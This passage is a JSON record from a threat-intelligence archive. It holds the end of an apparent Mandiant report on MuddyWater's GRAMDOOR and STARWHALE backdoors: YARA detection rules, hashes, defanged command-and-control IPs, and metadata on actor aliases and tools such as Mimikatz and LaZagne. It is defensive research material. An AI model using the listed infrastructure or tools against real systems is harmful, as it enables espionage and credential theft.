Actions\n\nOrganizations can validate their security controls using the following actions with Mandiant Security\nValidation.\n\n**VID** **Name**\n\nA102-562 Command and Control - GRAMDOOR, DNS Query, Variant #1\n\nA102-563 Malicious File Transfer - GRAMDOOR, Download, Variant #1\n\nA102-564 Malicious File Transfer - GRAMDOOR, Download, Variant #2\n\nA102-565 Malicious File Transfer - STARWHALE, Download, Variant #1\n\nA102-566 Malicious File Transfer - STARWHALE, Download, Variant #2\n\nA102-567 Malicious File Transfer - STARWHALE, Download, Variant #3\n\nA102-568 Malicious File Transfer - STARWHALE.GO, Download, Variant #1\n\nA104-975 Protected Theater - GRAMDOOR, Execution, Variant #1\n\nA104-976 Protected Theater - STARWHALE, Execution, Variant #1\n\nA104-977 Host CLI - GRAMDOOR, Registry Persistence, Variant #1\n\nA104-978 Host CLI - STARWHALE, Service Persistence, Variant #1\n\n## YARA Rules\n\n\n-----\n\nrule M_Hunting_Backdoor_STARWHALE_1\n\n{\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Detects strings for STARWHALE samples\"\n\nmd5 = \" cb84c6b5816504c993c33360aeec4705\"\n\nrev = 1\n\nstrings:\n\n$s1 = \"JSCript\" ascii nocase wide\n\n$s2 = \"VBSCript\" ascii nocase wide\n\n$s3 = \"WScript.Shell\" ascii nocase wide\n\n$s4 = \"ok\" ascii nocase wide\n\n$s5 = \"no\" ascii nocase wide\n\n$s6 = \"stari.txt\" ascii nocase wide\n\n$s7 = \"SoRRy\" ascii wide\n\n$s8 = \"EMIP\" ascii wide\n\n$s9 = \"NIp\" ascii wide\n\n$s10 = \"401\" ascii wide\n\n$s11 = \"_!#\" ascii wide\n\n$s12 = \"/!&^^&!/\" ascii wide\n\n$s13 = \"|!)!)!|\" ascii wide\n\n$s14 = \"|#@*@#|\" ascii wide\n\n$s15 = \"/!*##*!/\" ascii wide\n\n$s16 = \"sory\" ascii nocase wide\n\ncondition:\n\nfilesize > 5KB and filesize < 5MB and 10 of ($s*)\n\n}\n\n\n-----\n\nrule M_Hunting_Backdoor_STARWHALE_GO_1 {\n\nmeta:\n\nauthor = \"Mandiant\"\n\ndescription = \"Detects strings for STARWHALE.GO\"\n\nstrings:\n\n$main1 = \"main.findExecutable\" ascii\n\n$main2 = \"main.showMatrixElements\" ascii\n\n$delim = \"|&&%&&|\" ascii\n\n$matrix = \"MATRIX1*MATRIX2\" ascii\n\n$sample = \"1522526f4260f4653664276774\" ascii\n\ncondition:\n\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and filesize < 15MB and 4 of them\n\n}\n\n## Indicators of Compromise\n\n**Type** **Value** **Description**\n\nMD5 7c3564cd166822be4932986cb8158409 CrackMapExec\n\nMD5 7fefce7f2e4088ce396fd146a7951871 LIGOLO\n\nMD5 5763530f25ed0ec08fb26a30c04009f1 GRAMDOOR\n\nMD5 15fa3b32539d7453a9a85958b77d4c95 GRAMDOOR\n\nMD5 cb84c6b5816504c993c33360aeec4705 STARWHALE\n\nMD5 c8ff058db87f443c0b85a286a5d4029e ScreenConnect\n\nIP 88.119.175[.]112 LIGOLO C&C\n\nIP 95.181.161[.]50 LIGOLO C&C\n\nIP 45.153.231[.]104 LIGOLO C&C\n\nIP 95.181.16[.]81 Malware/Tools Hosting\n\nIP 5.199.133[.]149 STARWHALE C&C\n\nIP 45.142.213[.]17 STARWHALE C&C\n\n\n-----\n\nIP 87.236.212[.]184 STARWHALE.GO C&C\n\n## Acknowledgements\n\nSpecial thanks to Mike Hunoff, Nick Harbour, and Muhammad Umair for their assistance with reverse\nengineering the malware discussed in this blog post, and Adrien Bataille and Ervin James Ocampo for\ncreating detections for malware families. Additionally, we would also like to thank Dan Andreiana, Alexander\nPennino, Nick Richards, Jake Nicastro, Sarah Jones, and Geoff Ackerman for their help with technical\nreview and providing valuable feedback.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-24 - Left On Read- Telegram Malware Spotted in Latest Iranian Cyber Espionage Activity.pdf"
    ],
    "report_names": [
        "2022-02-24 - Left On Read- Telegram Malware Spotted in Latest Iranian Cyber Espionage Activity.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ed8d590-defa-4873-b2de-b75c9b30931e",
            "created_at": "2023-01-06T13:46:38.730137Z",
            "updated_at": "2025-03-27T02:00:02.903261Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "Boggy Serpens",
                "Mango Sandstorm",
                "TEMP.Zagros",
                "Static Kitten",
                "G0069",
                "TA450",
                "Earth Vetala",
                "Seedworm",
                "COBALT ULSTER",
                "ATK51"
            ],
            "source_name": "MISPGALAXY:MuddyWater",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "31e69945-6c1e-40c3-ba8e-a77e81dd142a",
            "created_at": "2024-05-01T02:03:08.047377Z",
            "updated_at": "2025-03-27T02:05:17.326452Z",
            "deleted_at": null,
            "main_name": "COBALT ULSTER",
            "aliases": [
                "ENT-11 ",
                "ITG17 ",
                "MERCURY ",
                "Mango Sandstorm ",
                "MuddyWater ",
                "STAC 1171 ",
                "Seedworm ",
                "Static Kitten ",
                "TEMP.Zagros ",
                "UNC3313 ",
                "Yellow Nix ",
                "Earth Vetala "
            ],
            "source_name": "Secureworks:COBALT ULSTER",
            "tools": [
                " Canopy",
                " CrackMapExec",
                " CredNinja",
                " Empire",
                " FORELORD",
                " Koadic",
                " LaZagne",
                " Ligolo",
                " MKL64",
                " Metasploit",
                " Mimikatz",
                " MiniDump",
                " Mori",
                " MuddyC2Go",
                " MuddyC3",
                " PhonyC2",
                " Plink",
                " PowGoop",
                " PowerStats",
                " RemoteUtilities",
                " Revsocks",
                " ScreenConnect",
                " SimpleHelp",
                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "02e1c2df-8abd-49b1-91d1-61bc733cf96b",
            "created_at": "2022-10-25T15:50:23.308924Z",
            "updated_at": "2025-03-27T02:00:55.437268Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "MuddyWater",
                "Earth Vetala",
                "Static Kitten",
                "Seedworm",
                "TEMP.Zagros",
                "Mango Sandstorm",
                "TA450"
            ],
            "source_name": "MITRE:MuddyWater",
            "tools": [
                "STARWHALE",
                "POWERSTATS",
                "Out1",
                "PowerSploit",
                "Small Sieve",
                "Mori",
                "Mimikatz",
                "LaZagne",
                "PowGoop",
                "CrackMapExec",
                "ConnectWise",
                "SHARPSTATS",
                "RemoteUtilities",
                "Koadic"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3c430d71-ab2b-4588-820a-42dd6cfc39fb",
            "created_at": "2022-10-25T16:07:23.880522Z",
            "updated_at": "2025-03-27T02:02:10.010443Z",
            "deleted_at": null,
            "main_name": "MuddyWater",
            "aliases": [
                "ATK 51",
                "Boggy Serpens",
                "Cobalt Ulster",
                "ITG17",
                "Mango Sandstorm",
                "MuddyWater",
                "Operation BlackWater",
                "Operation Earth Vetala",
                "Operation Quicksand",
                "Seedworm",
                "Static Kitten",
                "T-APT-14",
                "TA450",
                "TEMP.Zagros",
                "Yellow Nix"
            ],
            "source_name": "ETDA:MuddyWater",
            "tools": [
                "Agentemis",
                "BugSleep",
                "CLOUDSTATS",
                "ChromeCookiesView",
                "Cobalt Strike",
                "CobaltStrike",
                "CrackMapExec",
                "DELPHSTATS",
                "EmPyre",
                "EmpireProject",
                "FruityC2",
                "Koadic",
                "LOLBAS",
                "LOLBins",
                "LaZagne",
                "Living off the Land",
                "MZCookiesView",
                "Meterpreter",
                "Mimikatz",
                "MuddyC2Go",
                "MuddyRot",
                "Mudwater",
                "POWERSTATS",
                "PRB-Backdoor",
                "PhonyC2",
                "PowGoop",
                "PowerShell Empire",
                "PowerSploit",
                "Powermud",
                "QUADAGENT",
                "SHARPSTATS",
                "SSF",
                "Secure Socket Funneling",
                "Shootback",
                "Smbmap",
                "Valyria",
                "chrome-passwords",
                "cobeacon",
                "prb_backdoor"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536016,
    "ts_updated_at": 1743041774,
    "ts_creation_date": 1653781419,
    "ts_modification_date": 1653781419,
    "files": {
        "pdf": "https://archive.orkl.eu/e3151e3b42393c6665d7ca3731402c598c305e2b.pdf",
        "text": "https://archive.orkl.eu/e3151e3b42393c6665d7ca3731402c598c305e2b.txt",
        "img": "https://archive.orkl.eu/e3151e3b42393c6665d7ca3731402c598c305e2b.jpg"
    }
}